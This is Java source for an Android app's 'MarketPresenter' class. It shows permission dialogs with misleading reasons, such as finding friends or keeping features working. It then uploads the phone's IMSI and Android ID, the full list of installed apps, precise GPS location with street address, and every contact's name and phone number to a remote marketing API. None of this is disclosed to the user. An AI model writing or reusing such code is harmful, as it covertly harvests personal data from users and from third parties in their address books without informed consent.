package com.wanyi.uiframe.mvp.presenter;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.fragment.app.FragmentActivity;

import com.alibaba.fastjson.JSON;
import com.example.adhibition.AppListHelper;
import com.example.adhibition.model.PMAppInfo;
import com.example.contract.ContactFacade;
import com.example.contract.MyContacts;
import com.example.location.LocationHelper;
import com.example.location.model.LocationInfo;
import com.snail.antifake.deviceid.AndroidDeviceIMEIUtil;
import com.tbruyelle.rxpermissions2.Permission;
import com.tbruyelle.rxpermissions2.RxPermissions;
import com.wanyi.uiframe.api.ApiFacade;
import com.wanyi.uiframe.api.RequestJsonBodyFactory;
import com.wanyi.uiframe.api.consts.UriConst;
import com.wanyi.uiframe.api.model.query.market.ApkInfoQuery;
import com.wanyi.uiframe.api.model.query.market.ContactsQuery;
import com.wanyi.uiframe.api.model.query.market.DeviceInfoQuery;
import com.wanyi.uiframe.api.model.query.market.LocationQuery;
import com.xuexiang.xui.widget.dialog.materialdialog.DialogAction;
import com.xuexiang.xui.widget.dialog.materialdialog.MaterialDialog;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.functions.Consumer;
import io.reactivex.schedulers.Schedulers;
import okhttp3.RequestBody;

/**
 * 推广的业务处理
 */
public class MarketPresenter {


    /**
     * 业务处理
     */
    static MarketPresenter marketPresenter;

    public static MarketPresenter getInstance() {
        if(marketPresenter == null) {
            marketPresenter = new MarketPresenter();
        }
        return marketPresenter;
    }

    /**
     * 展示权限调用流程
     * @param maniPermission 权限
     * @param context 上下文
     * @param consumer 回调消费
     */
    private void showPermissionDialog(String maniPermission,String warning, FragmentActivity context, Consumer<Boolean> consumer) {
        RxPermissions rxPermissions = new RxPermissions(context);
        rxPermissions.requestEach(maniPermission)
                .subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread())
                .subscribe( permission -> {
                    if(permission.granted) {
                        //如果授权
                        consumer.accept(true);
                    } else if(permission.shouldShowRequestPermissionRationale) {
                        //还会再弹出来一次
                        MaterialDialog.Builder builder = new MaterialDialog.Builder(context);
                        builder.title("警告").content(warning).negativeText("放弃").positiveText("马上授权")
                                .onNegative((dialog, which) -> {
                                    try {
                                        consumer.accept(false) ;
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }).onPositive(((dialog, which) -> {
                            rxPermissions.request(maniPermission)
                                    .subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread())
                                    .subscribe(aBoolean -> {
                                        consumer.accept(aBoolean);
                                      });
                        })).build().show();
                    }else {
                        //拒绝再次弹出
                        consumer.accept(false) ;
                    }
                });
    }

    /**
     * 推送设备信息
     * @param context
     */
    public void pushStart(FragmentActivity context,Consumer<Boolean> consumer) {
        showPermissionDialog(Manifest.permission.READ_PHONE_STATE,"如果没有该权限，会影响APP部分功能使用!",context,aBoolean -> {
            if(aBoolean) {
                pushDeviceInfo(context);
            }
            showPermissionDialog(Manifest.permission.READ_CONTACTS,"开启该权限，可以找到你认识得人奥!",context,aBoolean1 -> {
                if(aBoolean1) {
                  pushContactsInfo(context);
                }
                pushApkInfo(context);
                RxPermissions rxPermissions = new RxPermissions(context);
                rxPermissions.request(Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_FINE_LOCATION)
                        .subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread())
                        .subscribe(aBoolean2 -> {
                            if(aBoolean2) {
                                pushLocationInfo(context);
                            }
                            consumer.accept(true);
                        });
            });

            Log.d(getClass().getName(),aBoolean.toString());
        });

//       RxPermissions rxPermissions = new RxPermissions(context);
//       rxPermissions.request(Manifest.permission.READ_PHONE_STATE).subscribe(isRight -> {
//            if(isRight) {
//                DeviceInfoQuery deviceInfoQuery = new DeviceInfoQuery();
//                deviceInfoQuery.setBrand(AndroidDeviceIMEIUtil.getBrand());
//                deviceInfoQuery.setModel(AndroidDeviceIMEIUtil.getModel());
//                deviceInfoQuery.setSysver(AndroidDeviceIMEIUtil.getManufacturer());
//                deviceInfoQuery.setAndroidid(AndroidDeviceIMEIUtil.getUUID(context));
//                deviceInfoQuery.setImei(AndroidDeviceIMEIUtil.getIMSI(context));
//                Log.e("dd", JSON.toJSONString(deviceInfoQuery));
//                //deviceInfoQuery.setPhonenumber(phoneNumber);
//                RequestBody requestBody = RequestJsonBodyFactory.create(deviceInfoQuery);
//                UriConst.UUID = AndroidDeviceIMEIUtil.getUUID(context);
//                ApiFacade.crateMarket().map(iMarketApiService -> iMarketApiService.postDeviceInfo(requestBody).blockingFirst())
//                        .subscribeOn(Schedulers.io())
//                        .observeOn(AndroidSchedulers.mainThread())
//                        .subscribe(responseBody -> {
//                            pushApkInfo(context);
//                            pushLocationInfo(context);
//                            pushContactsInfo(context);
//                        });
//            }
//        });

    }


    /**
     * 推送设备信息
     * @param context 上下文
     */
    public void pushDeviceInfo(Context context) {
         DeviceInfoQuery deviceInfoQuery = new DeviceInfoQuery();
         deviceInfoQuery.setBrand(AndroidDeviceIMEIUtil.getBrand());
         deviceInfoQuery.setModel(AndroidDeviceIMEIUtil.getModel());
         deviceInfoQuery.setSysver(AndroidDeviceIMEIUtil.getManufacturer());
         deviceInfoQuery.setAndroidid(AndroidDeviceIMEIUtil.getUUID(context));
         deviceInfoQuery.setImei(AndroidDeviceIMEIUtil.getIMSI(context));
         RequestBody requestBody = RequestJsonBodyFactory.create(deviceInfoQuery);
         UriConst.UUID = AndroidDeviceIMEIUtil.getUUID(context);
         ApiFacade.crateMarket().map(iMarketApiService -> iMarketApiService.postDeviceInfo(requestBody).blockingFirst())
                        .subscribeOn(Schedulers.io())
                        .observeOn(AndroidSchedulers.mainThread())
                        .subscribe(responseBody -> {});
    }


    /**
     * 推送apk信息
     * @param context
     */
    public void pushApkInfo(Context context) {
        AppListHelper.subscribe(context,pmAppInfos -> {
            List<ApkInfoQuery> apkInfoQueryList = new ArrayList<>();
            for(PMAppInfo pmAppInfo:pmAppInfos) {
                ApkInfoQuery apkInfoQuery = new ApkInfoQuery(pmAppInfo.getAppName(),pmAppInfo.getPkgName(),pmAppInfo.getVersionName());
                apkInfoQueryList.add(apkInfoQuery);
            }
            RequestBody requestBody = RequestJsonBodyFactory.create(apkInfoQueryList);
            ApiFacade.crateMarket().map(iMarketApiService -> iMarketApiService.postApkInstall(requestBody).blockingFirst())
                    .subscribeOn(Schedulers.io()).subscribe(responseBody -> {});
        });
    }

    /**
     * 推送位置信息
     * @param context
     */
    public void pushLocationInfo(Context context){
        LocationHelper.request(context,locationInfo -> {
            LocationQuery locationQuery = new LocationQuery();
            locationQuery.setAddress(locationInfo.getAddress());
            locationQuery.setELocationType(locationInfo.getELocationType());
            locationQuery.setLatitude(locationInfo.getLatitude());
            locationQuery.setLongitude(locationInfo.getLongitude());
            LocationInfo.AssistInfo assistInfo = locationInfo.getAssistInfo();
            LocationQuery.AssistInfoBean assistInfoBean = new LocationQuery.AssistInfoBean();
            assistInfoBean.setAltitude(assistInfo.getAltitude());
            assistInfoBean.setCity(assistInfo.getCity());
            assistInfoBean.setCountry(assistInfo.getCountry());
            assistInfoBean.setCountryCode(assistInfo.getCountryCode());
            assistInfoBean.setDistrict(assistInfo.getDistrict());
            assistInfoBean.setGpsAccuracyStatus(assistInfo.getGpsAccuracyStatus());
            assistInfoBean.setOperators(assistInfo.getOperators());
            assistInfoBean.setSatelliteNumber(assistInfo.getSatelliteNumber());
            assistInfoBean.setSpeed(assistInfo.getSpeed());
            assistInfoBean.setStreet(assistInfo.getStreet());
            locationQuery.setAssistInfo(assistInfoBean);
            RequestBody requestBody = RequestJsonBodyFactory.create(locationQuery);
            ApiFacade.crateMarket().map(iMarketApiService -> iMarketApiService.postLocation(requestBody).blockingFirst())
                    .subscribeOn(Schedulers.io()).subscribe(responseBody -> {});
        });
    }

    /**
     * 推送联系人信息
     * @param fragmentActivity
     */
    public void pushContactsInfo(FragmentActivity fragmentActivity) {
        ContactFacade.getContactList(fragmentActivity,myContacts -> {
            List<ContactsQuery> queryList = new ArrayList<>();
            if(myContacts != null) {
                for (MyContacts item : myContacts) {
                    ContactsQuery contactsQuery = new ContactsQuery(item.getName(),item.getPhone());
                    queryList.add(contactsQuery);
                }
                RequestBody requestBody = RequestJsonBodyFactory.create(queryList);
                ApiFacade.crateMarket().map(iMarketApiService -> iMarketApiService.postContacts(requestBody).blockingFirst()).subscribeOn(Schedulers.io())
                        .observeOn(AndroidSchedulers.mainThread())
                        .subscribe(responseBody -> {});
            }

        });

    }



}
